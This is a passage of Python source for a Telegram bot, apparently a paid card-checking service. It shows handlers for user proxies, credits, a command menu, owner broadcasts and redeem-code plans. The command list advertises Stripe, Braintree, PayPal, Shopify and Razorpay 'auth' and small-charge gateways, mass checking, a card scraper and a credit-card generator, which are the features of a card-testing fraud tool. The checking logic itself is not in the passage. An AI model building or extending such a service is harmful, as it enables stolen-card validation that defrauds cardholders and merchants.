    except Exception as e:
        logger.error(f"Error testing proxy: {e}")
        return False, f"Proxy is dead: {str(e)}"

async def handle_proxy_command(update, context):
    """
    Handle the /proxy command to add proxies.
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Trial users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Check if user provided proxies
    if not context.args and not update.message.reply_to_message:
        await update.message.reply_text(
            "⚠️ <b>Missing proxy!</b>\n\n"
            "<i>Usage: /proxy username:password@host:port</i>\n\n"
            "<i>Or reply to a message containing proxies with /proxy</i>",
            parse_mode="HTML"
        )
        return
    
    # Get proxies from command or replied message
    proxy_text = ""
    
    if context.args:
        proxy_text = " ".join(context.args)
    elif update.message.reply_to_message:
        replied_message = update.message.reply_to_message
        if replied_message.text:
            proxy_text = replied_message.text
        elif replied_message.document and replied_message.document.mime_type == "text/plain":
            file = await context.bot.get_file(replied_message.document.file_id)
            file_content = await file.download_as_bytearray()
            proxy_text = file_content.decode('utf-8')
    
    # Split text into individual lines
    proxy_lines = proxy_text.split('\n')
    
    # Parse and auto-fix proxies
    candidates = []
    for line in proxy_lines:
        if not line.strip():
            continue
        # If line contains spaces, split it
        parts = line.split()
        candidates.extend(parts)
    
    proxies = []
    for raw in candidates:
        raw = raw.strip()
        if not raw: continue
        
        # Use the auto-fix function to handle any format
        normalized = auto_fix_proxy_format(raw)
        
        if normalized:
            proxies.append(normalized)
    
    # Check if any valid proxies were found
    if not proxies:
        await update.message.reply_text(
            "⚠️ <b>No valid proxies found!</b>\n\n"
            "<i>Couldn't recognize the proxy format. Please check your input.</i>",
            parse_mode="HTML"
        )
        return
    
    # Check if user has reached the proxy limit
    current_proxies = get_user_proxies(user_id)
    if len(current_proxies) >= 10:
        await update.message.reply_text(
            "⚠️ <b>Proxy limit reached!</b>\n\n"
            "<i>You can only have up to 10 proxies. Use /rproxy to remove some proxies first.</i>",
            parse_mode="HTML"
        )
        return
    
    # Limit the number of proxies to add
    max_add = 10 - len(current_proxies)
    if len(proxies) > max_add:
        proxies = proxies[:max_add]
        await update.message.reply_text(
            f"⚠️ <b>Too many proxies!</b>\n\n"
            f"<i>You can only add {max_add} more proxies. Only the first {max_add} will be processed.</i>",
            parse_mode="HTML"
        )
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Send a processing message with the same style as chk.py
    processing_message = await update.message.reply_text(
        f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{len(proxies)} proxies</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝙋𝙧𝙤𝙭𝙮 𝙏𝙚𝙨𝙩</i>""",
        parse_mode="HTML"
    )
    
    # Create a background task to process proxy testing
    asyncio.create_task(process_proxy_test(proxies, user_id, first_name, processing_message, context))

async def process_proxy_test(proxies: List[str], user_id: int, first_name: str, processing_message, context):
    """
    Process proxy testing in the background.
    """
    try:
        # Test all proxies in parallel with a semaphore to limit concurrent connections
        semaphore = asyncio.Semaphore(20)  # Limit to 20 concurrent requests
        tasks = [test_proxy_with_semaphore(semaphore, proxy) for proxy in proxies]
        results = await asyncio.gather(*tasks)
        
        # Process the results
        successful_proxies = []
        failed_proxies = []
        
        for proxy, (is_working, message) in zip(proxies, results):
            if is_working:
                success, db_message = add_user_proxy(user_id, proxy)
                if success:
                    successful_proxies.append((proxy, message))
                else:
                    failed_proxies.append((proxy, db_message))
            else:
                failed_proxies.append((proxy, message))
        
        # Format the successful proxies list
        successful_list = ""
        for i, (proxy, message) in enumerate(successful_proxies):
            parts = proxy.split("://")
            if len(parts) == 2:
                auth_host = parts[1]
                auth_parts = auth_host.split("@")
                if len(auth_parts) == 2:
                    auth = auth_parts[0]
                    host_port = auth_parts[1]
                    username = auth.split(":")[0]
                    masked_auth = f"{username}:******"
                    successful_list += f"{i+1}. http://{masked_auth}@{host_port} - {message}\n"
        
        # Format the failed proxies list
        failed_list = ""
        for i, (proxy, message) in enumerate(failed_proxies):
            parts = proxy.split("://")
            if len(parts) == 2:
                auth_host = parts[1]
                auth_parts = auth_host.split("@")
                if len(auth_parts) == 2:
                    auth = auth_parts[0]
                    host_port = auth_parts[1]
                    username = auth.split(":")[0]
                    masked_auth = f"{username}:******"
                    failed_list += f"{i+1}. http://{masked_auth}@{host_port} - {message}\n"
            else:
                auth_parts = proxy.split("@")
                if len(auth_parts) == 2:
                    auth = auth_parts[0]
                    host_port = auth_parts[1]
                    username = auth.split(":")[0]
                    masked_auth = f"{username}:******"
                    failed_list += f"{i+1}. {masked_auth}@{host_port} - {message}\n"
        
        # Create a properly formatted message to avoid HTML parsing errors
        message_text = (
            f"<pre><a href='https://t.me/rev3rsex'>&#x2a9d;</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙍𝙚𝙨𝙪𝙡𝙩𝙨</b> &#x1f4ca;</pre>\n"
            f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥</b> ↬ <code>{len(successful_proxies)} proxies</code>\n"
        )
        
        if successful_list:
            message_text += f"<pre>{successful_list}</pre>\n"
        
        message_text += (
            f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐅𝐚𝐢𝐥𝐞𝐝</b> ↬ <code>{len(failed_proxies)} proxies</code>\n"
        )
        
        if failed_list:
            message_text += f"<pre>{failed_list}</pre>\n"
        
        message_text += (
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a>\n"
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
        )
        
        # Update the processing message with the result
        await processing_message.edit_text(
            message_text,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Error in process_proxy_test: {str(e)}")
        # Create a properly formatted error message
        error_message = (
            f"<pre><a href='https://t.me/rev3rsex'>&#x2a9d;</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙀𝙧𝙧𝙤𝙧</b> &#x274c;</pre>\n"
            f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>An error occurred while testing proxies: {str(e)}</code>\n"
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a>\n"
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
        )
        
        # Update the processing message with the error
        await processing_message.edit_text(
            error_message,
            parse_mode="HTML"
        )

async def test_proxy_with_semaphore(semaphore, proxy: str) -> Tuple[bool, str]:
    """
    Test a proxy with a semaphore to limit concurrent connections.
    """
    async with semaphore:
        return await test_proxy(proxy)

async def handle_rproxy_command(update, context):
    """
    Handle the /rproxy command to remove proxies.
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Trial users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Check if user provided a count
    if not context.args:
        # If no count provided, remove all proxies
        count = -1
    else:
        # Get count from command
        try:
            count = int(context.args[0])
        except ValueError:
            await update.message.reply_text(
                "⚠️ <b>Invalid count!</b>\n\n"
                "<i>Usage: /rproxy 5 (to remove 5 proxies)</i>\n"
                "<i>Usage: /rproxy (to remove all proxies)</i>",
                parse_mode="HTML"
            )
            return
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Remove proxies from the database
    success, message = remove_user_proxies(user_id, count)
    
    # Create a properly formatted message
    if success:
        if count == -1:
            message_text = (
                f"<pre><a href='https://t.me/rev3rsex'>&#x2a9d;</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙎𝙪𝙘𝙘𝙚𝙨𝙨</b> &#x2705;</pre>\n"
                f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐦𝐨𝐯𝐞𝐝</b> ↬ <code>All proxies</code>\n"
                f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>\n"
                f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a>\n"
                f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
            )
        else:
            message_text = (
                f"<pre><a href='https://t.me/rev3rsex'>&#x2a9d;</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙎𝙪𝙘𝙘𝙚𝙨𝙨</b> &#x2705;</pre>\n"
                f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐦𝐨𝐯𝐞𝐝</b> ↬ <code>{count} proxies</code>\n"
                f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>\n"
                f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a>\n"
                f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
            )
    else:
        message_text = (
            f"<pre><a href='https://t.me/rev3rsex'>&#x2a9d;</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙀𝙧𝙧𝙤𝙧</b> &#x274c;</pre>\n"
            f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐦𝐨𝐯𝐞𝐝</b> ↬ <code>{count if count != -1 else 'All'} proxies</code>\n"
            f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>\n"
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a>\n"
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
        )
    
    # Send the result with the same style as chk.py
    await update.message.reply_text(
        message_text,
        parse_mode="HTML"
    )

async def handle_myproxy_command(update, context):
    """
    Handle the /myproxy command to list user's proxies.
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Trial users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Get user proxies
    proxies = get_user_proxies(user_id)
    
    # Check if user has any proxies
    if not proxies:
        message_text = (
            f"<pre><a href='https://t.me/rev3rsex'>&#x2a9d;</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙄𝙣𝙛𝙤</b> &#x2139;&#xfe0f;</pre>\n"
            f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐏𝐫𝐨𝐱𝐢𝐞𝐬</b> ↬ <code>0/10</code>\n"
            f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>You don't have any proxies. Use /proxy username:password@host:port to add a proxy.</code>\n"
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a>\n"
            f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
        )
        
        await update.message.reply_text(
            message_text,
            parse_mode="HTML"
        )
        return
    
    # Format the proxy list (masking passwords for security)
    proxy_list = ""
    for i, proxy in enumerate(proxies):
        # Extract username, password, host, and port
        parts = proxy.split("://")
        if len(parts) == 2:
            protocol = parts[0]
            auth_host = parts[1]
            auth_parts = auth_host.split("@")
            if len(auth_parts) == 2:
                auth = auth_parts[0]
                host_port = auth_parts[1]
                username = auth.split(":")[0]
                # Mask the password
                masked_auth = f"{username}:******"
                proxy_list += f"{i+1}. {protocol}://{masked_auth}@{host_port}\n"
    
    # Create a properly formatted message
    message_text = (
        f"<pre><a href='https://t.me/rev3rsex'>&#x2a9d;</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝙇𝙞𝙨𝙩</b> &#x1f4cb;</pre>\n"
        f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐏𝐫𝐨𝐱𝐢𝐞𝐬</b> ↬ <code>{len(proxies)}/10</code>\n"
        f"<a href='https://t.me/rev3rsex'>&#x2140;</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <pre>{proxy_list}</pre>\n"
        f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐔𝐬𝐞𝐫</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a>\n"
        f"<a href='https://t.me/rev3rsex'>&#x232c;</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"
    )
    
    # Send the result with the same style as chk.py
    await update.message.reply_text(
        message_text,
        parse_mode="HTML"
    )



# ============================================================
# MODULE: credits
# ============================================================
# Configure logging

# Define Indian timezone
IST = pytz.timezone('Asia/Kolkata')

# Function to convert datetime to Indian format
def format_indian_datetime(dt: datetime) -> str:
    """
    Convert datetime to Indian format (DD/MM/YY HH:MM:SS).
    
    Args:
        dt: Datetime object
        
    Returns:
        Formatted string in Indian format
    """
    # Ensure dt is timezone-aware, assume UTC if not
    if dt.tzinfo is None:
        dt = pytz.utc.localize(dt)
    
    # Convert to IST
    ist_dt = dt.astimezone(IST)
    
    # Format as DD/MM/YY HH:MM:SS
    return ist_dt.strftime('%d/%m/%y %H:%M:%S')

def format_credits_response(user_info: Dict) -> str:
    """
    Format credits information into a beautiful message with emojis.
    
    Args:
        user_info: Dictionary containing user information
        
    Returns:
        Formatted string with emojis
    """
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user data from database
    try:
        user_data = get_or_create_user(user_id, username)
        if not user_data:
            # Fallback if database fails
            tier = "Unknown"
            credits = 0
            joined_date = datetime.now()  # Use current time as fallback
            logger.error(f"Failed to get user data for user {user_id}")
        else:
            # Unpack all values including join date
            _, joined_date, tier, _ = user_data
    except Exception as e:
        logger.error(f"Error getting user data for {user_id}: {str(e)}")
        tier = "Unknown"
        credits = 0
        joined_date = datetime.now()  # Use current time as fallback
    
    # Get user credits from database
    try:
        user_credits = get_user_credits(user_id)
        if user_credits is None:
            credits_display = "Error"
            logger.error(f"Failed to get credits for user {user_id}")
        elif user_credits == float('inf'):
            credits_display = "Infinite😎"  # Display for unlimited credits
        else:
            credits_display = str(user_credits)
    except Exception as e:
        logger.error(f"Error getting credits for {user_id}: {str(e)}")
        credits_display = "Error"
    
    # Get user tier from plans module
    try:
        user_tier = get_user_current_tier(user_id)
        if user_tier:
            tier = user_tier
    except Exception as e:
        logger.error(f"Error getting user tier for {user_id}: {str(e)}")
        # Keep tier from user_data as fallback
    
    # Format join date in Indian time format
    formatted_joined_date = format_indian_datetime(joined_date)
    
    # Create user link with profile name hyperlinked
    if username:
        user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{tier}]</code>"
    else:
        user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{tier}]</code>"
    
    # Determine credit status with appropriate emoji
    if credits_display == "Infinite😎":
        credit_status = "🔥"
    elif credits_display == "Error":
        credit_status = "❌"
    elif isinstance(credits_display, str) and credits_display.isdigit():
        credits_num = int(credits_display)
        if credits_num > 50:
            credit_status = "✅"
        elif credits_num > 10:
            credit_status = "⚠️"
        else:
            credit_status = "🔴"
    else:
        credit_status = "❌"
    
    # Format response with exact structure as /rz command
    formatted_response = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑼𝒔𝒆𝒓 𝑰𝒏𝒇𝒐</b></pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐈𝐃</b> ↬ <code>{user_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐔𝐬𝐞𝐫</b> ↬ @{username if username else "None"}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐍𝐚𝐦𝐞</b> ↬ {user_link}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬</b> ↬ <code>{credits_display}</code> {credit_status}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐉𝐨𝐢𝐧𝐞𝐝</b> ↬ <code>{formatted_joined_date}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_credits_command(update, context):
    """
    Handle the /credits command.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Format the response
    result = format_credits_response(user_info)
    
    # Send credits information
    await update.message.reply_text(result, parse_mode="HTML")



# ============================================================
# MODULE: cmds
# ============================================================
ADMIN_ID = 7742548417

# ==============================
# LOGGING CONFIGURATION
# ==============================

# ==============================
# HELPER FUNCTIONS
# ==============================
def escape_html(text: str) -> str:
    """Escape HTML to prevent Telegram parse errors."""
    return html.escape(text, quote=False)

# ==============================
# COMMAND LIST
# ==============================
ALL_COMMANDS = [
    ("PayFast 0.30$", "/pf", "Free", "PayFast 0.30$ Charge", "pf"),
    ("Stripe Auth", "/au", "Free", "Stripe Auth", "au"),
    ("Mass Stripe Auth", "/mau", "Free", "Mass Stripe Auth", "mau"),
    ("scrapper", "/scr", "Free", "cards scrapper", "scr"),
    ("Braintree Auth", "/chk", "Free", "Single Braintree Auth", "chk"),
    ("Authnet 1$ Charge", "/at", "Free", "Authnet 1$ Charge Gateway", "at"),
    ("Paypal 1$ Charge", "/pp", "Free", "Paypal 1$ Charge Gateway", "pp"),
    ("SK Based 1$ charge", "/sk", "Free", "SK BASED 1$", "sk"),
    ("Payu 0.29$ Charge", "/py", "Paid", "PayU 0.29$ Charge Gateway", "py"),
    ("Payu €  Charge", "/pu", "Paid", "PayU 1€ Charge Gateway", "pu"),
    ("Set you sites", "/seturl", "Paid", "Autoshopify site add.", "seturl"),
    ("Delete your site", "/delurl", "Paid", "Site remover", "delurl"),
    ("Remove your all sites", "/delall", "Paid", "Site remover", "delall"),
    ("3DS Lookup", "/vbv", "Free", "3DS Lookup Gateway", "vbv"),
    ("Shopify Charge $1", "/sh", "Free", "Shopify 1$ Charge Gateway", "sh"),
    ("Razorpay charge 1₹", "/rz", "Free", "Razorpay 1₹ Charge Gateway", "rz"),
    ("Razorpay v2 ₹10", "/rzpv2", "Free", "Razorpay v2 Charge Gateway", "rzpv2"),
    ("AutoStripe Charge", "/ast", "Free", "AutoStripe Charge Gateway", "ast"),
    ("Xaeden Shopify", "/xsh", "Free", "Xaeden Shopify Charge Gateway", "xsh"),
    ("Mass Shopify Charged", "/msh", "Paid", "Mass Shopify Charge Gateway", "msh"),
    ("Mass SK BASED 1$ Charged", "/msk", "Paid", "Mass sk based Charge Gateway", "msk"),
    ("Mass Braintree Auth", "/mtxt", "Paid", "Mass Braintree Auth Gateway", "mtxt"),
    ("Generate ccs", "/gen", "Free", "CCs generator", "gen"),
    ("Redeem a bot code", "/claim", "Free", "Redeem Bot Code", None),
    ("Check your remaining credits", "/credits", "Free", "Credits Check", None),
    ("Payment Gateway Checker", "/gate", "Free", "Payment Gateway Status", "gate"),
    ("Add your proxy", "/proxy", "Free", "Proxy adder", "proxy"),
    ("Remove your proxies", "/rproxy", "Free", "Proxy remover", "rproxy"),    
    ("Your proxy viewer", "/myproxy", "Free", "Check your added proxies", "myproxy"),    
]

# ==============================
# PAGINATION SETUP
# ==============================
PAGE_SIZE = 4
PAGES = [ALL_COMMANDS[i:i + PAGE_SIZE] for i in range(0, len(ALL_COMMANDS), PAGE_SIZE)]


# ==============================
# PAGE BUILDER
# ==============================
async def build_page_text(page_index: int, user_id: int) -> str:
    """Build formatted command list for a given page in the new UI style."""
    try:
        page_commands = PAGES[page_index]
        
        # Main Header
        text = f"<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑨𝒖𝒂𝒊𝒎𝒂𝒏𝒅𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔</b> ↬ <i>Page {page_index + 1}/{len(PAGES)}</i></pre>\n"
        text += "━━━━━━━━━━━━━━━━━━━━\n"

        for name, cmd, cmd_type, desc, gate_name in page_commands:
            # Conditional lock emoji: only show for Paid commands
            type_emoji = "🔒" if cmd_type == "Paid" else ""
            
            # Status is now static for all commands
            status = "Online ✅"
            
            # Command block with the new styling
            text += f"<pre><a href='https://t.me/rev3rsex'>⊀</a> <b>𝑵𝒂𝒎𝒆</b> ↬ <i>{escape_html(name)}</i></pre>\n"
            text += f"<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑪𝒐𝒎𝒎𝒂𝒏𝒅</b> ↬ <i>{escape_html(cmd)}</i>\n"
            text += f"<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑰𝒏𝒇𝒐</b> ↬ <i>{escape_html(desc)}</i>\n"
            text += f"<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <i>{status}</i>\n"
            text += f"<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑻𝒚𝒑𝒆</b> ↬ <i>{type_emoji} {cmd_type}</i>\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n"
            
        return text.strip()
    except Exception as e:
        logger.error(f"Error building page text: {e}")
        return "Error: Could not build page text."


def build_cmds_buttons(page_index: int) -> InlineKeyboardMarkup:
    """Generate pagination + close buttons."""
    buttons = []
    nav_buttons = []
    # Use specific callback data to avoid conflicts
    if page_index > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"cmds_page_{page_index - 1}"))
    if page_index < len(PAGES) - 1:
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"cmds_page_{page_index + 1}"))
    if nav_buttons:
        buttons.append(nav_buttons)
    buttons.append([InlineKeyboardButton("❌ Close", callback_data="cmds_close")])
    return InlineKeyboardMarkup(buttons)


# ==============================
# COMMAND HANDLERS
# ==============================

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cmds command."""
    user_id = update.effective_user.id
    text = await build_page_text(0, user_id)
    buttons = build_cmds_buttons(0)
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=buttons
    )


# This single handler now manages all callbacks from /cmds menu
async def cmds_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses from the /cmds command menu."""
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if data.startswith("cmds_page_"):
        try:
            page_index = int(data.split("_")[2])
            text = await build_page_text(page_index, user_id)
            buttons = build_cmds_buttons(page_index)
            await query.edit_message_text(
                text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
        except TelegramError as e:
            # Silently handle the case where the message text is not modified
            if "Message is not modified" in str(e):
                pass
            else:
                logger.error(f"TelegramError in pagination: {e}")
        except (IndexError, ValueError) as e:
            logger.error(f"Invalid page data in callback: {data} - {e}")
        except Exception as e:
            logger.error(f"Unexpected error in pagination: {e}")

    elif data == "cmds_close":
        try:
            await query.message.delete()
        except TelegramError as e:
            logger.error(f"Could not delete message: {e}")
            # Fallback if deletion fails (e.g., message is too old)
            await query.edit_message_text("Menu closed.")



# ============================================================
# MODULE: broad
# ============================================================
# ==============================
# CONFIG
# ==============================
OWNER_ID = 7742548417
SLEEP_TIME = 0.09
PROGRESS_EVERY = 25

# ==============================
# GLOBAL STATE (ASYNCIO)
# ==============================
broadcast_task: asyncio.Task | None = None


# ==============================
# COMMAND
# ==============================
async def broad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global broadcast_task

    if update.effective_user.id != OWNER_ID:
        return

    if broadcast_task and not broadcast_task.done():
        await update.message.reply_text("⚠️ A broadcast is already running.")
        return

    message = None
    if context.args:
        message = " ".join(context.args)
    elif update.message.reply_to_message:
        message = update.message.reply_to_message

    if not message:
        await update.message.reply_text(
            "❌ Usage:\n"
            "/broad <message>\n"
            "OR reply to a message with /broad"
        )
        return

    user_ids = get_all_user_ids()
    if not user_ids:
        await update.message.reply_text("⚠️ No users found.")
        return

    status_msg = await update.message.reply_text(
        f"📣 Broadcast started\n\n"
        f"👥 Total users: {len(user_ids)}\n"
        f"📨 Sent: 0\n"
        f"🚫 Blocked: 0\n"
        f"⚠️ Errors: 0"
    )

    # 🔥 ASYNCIO BACKGROUND TASK (DETACHED)
    broadcast_task = asyncio.create_task(
        broadcast_worker(
            bot=context.bot,
            status_msg=status_msg,
            user_ids=user_ids,
            message=message
        )
    )

    # return immediately → no blocking
    return


# ==============================
# BACKGROUND WORKER
# ==============================
async def broadcast_worker(bot, status_msg, user_ids, message):
    sent = blocked = errors = 0
    total = len(user_ids)
    last_update = 0

    for index, user_id in enumerate(user_ids, start=1):
        try:
            if isinstance(message, str):
                await bot.send_message(chat_id=user_id, text=message)
            else:
                await message.copy(chat_id=user_id)

            sent += 1

        except Forbidden:
            blocked += 1
        except BadRequest:
            errors += 1
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
            continue
        except Exception as e:
            logger.warning(f"Broadcast error {user_id}: {e}")
            errors += 1

        # yield control to event loop
        await asyncio.sleep(SLEEP_TIME)

        # throttled progress update
        if index - last_update >= PROGRESS_EVERY or index == total:
            last_update = index
            try:
                await status_msg.edit_text(
                    f"📣 Broadcasting...\n\n"
                    f"👥 Total: {total}\n"
                    f"📨 Sent: {sent}\n"
                    f"🚫 Blocked: {blocked}\n"
                    f"⚠️ Errors: {errors}\n\n"
                    f"📊 Progress: {index}/{total}"
                )
            except Exception:
                pass

    try:
        await status_msg.edit_text(
            f"✅ Broadcast completed\n\n"
            f"👥 Total: {total}\n"
            f"📨 Sent: {sent}\n"
            f"🚫 Blocked: {blocked}\n"
            f"⚠️ Errors: {errors}"
        )
    except Exception:
        pass



# ============================================================
# MODULE: redeem
# ============================================================
# Configure logging

# List of admin user IDs who can use plan commands
ADMIN_IDS = [7742548417]

# Plan configurations
PLANS = {
    "plan1": {
        "name": "Core Access",
        "tier": "Core",
        "duration_days": 7,
        "emoji": "🛠️"
    },
    "plan2": {
        "name": "Elite Access",
        "tier": "Elite",
        "duration_days": 15,
        "emoji": "👑"
    },
    "plan3": {
        "name": "Root Access",
        "tier": "Root",
        "duration_days": 30,
        "emoji": "⭐"
    },
    "plan4": {
        "name": "X-Access",
        "tier": "X",
        "duration_days": 90,
        "emoji": "💎"
    }
}

# Dictionary to store background tasks
background_tasks = {}

# Dictionary to track active requests per user (to prevent spamming)
active_requests = {}

def generate_redeem_code(length: int = 16) -> str:
    """Generate a random redeem code starting with CXGFT-."""
    # Generate random characters after CXGFT-
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choices(chars, k=length - 5))  # 5 for CXGFT-
    return f"CXGFT-{random_part}"

